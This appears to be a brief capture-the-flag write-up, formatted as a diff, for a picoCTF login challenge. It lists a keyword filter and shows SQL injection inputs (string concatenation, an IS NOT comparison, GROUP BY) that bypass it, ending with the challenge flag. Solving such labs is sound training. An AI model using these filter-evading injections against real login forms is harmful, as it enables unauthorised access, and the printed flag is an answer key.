@@ -1,0 +1,21 @@
+# I get link for two sites, one which shows the filter of the signs i cannot use as sql injections to login
+      
+      Filters: or and true false union like = > < ; -- /* */ admin
+
+# In next link i try to login using
+   username : admin'
+   password : admin
+# It responses as " Filtered! " and does not give us any flag 
+
+# In the hint it says "spaces are not filtered " 
+# So now i try :
+   username : ad'||'min'
+   password : a' IS NOT 'b 
+# It responses as " not admin "
+
+# Since it is still not recognizing " admin " i try to change the password to " ' " 
+   username : ad'||'min' GROUP BY 
+   password : '
+# It responses as " Congrats! You won! Check out filter.php "
+   
+on checking the link we get the flag " picoCTF{0n3_m0r3_t1m3_86f3e77f3c5a076866a0fdb3b29c52fd} "
